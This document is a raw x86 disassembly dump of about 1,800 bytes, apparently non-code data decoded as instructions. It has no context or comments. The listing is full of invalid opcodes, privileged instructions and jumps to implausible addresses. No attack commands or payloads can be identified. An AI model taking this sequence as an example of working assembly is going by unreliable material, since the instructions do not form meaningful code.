  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
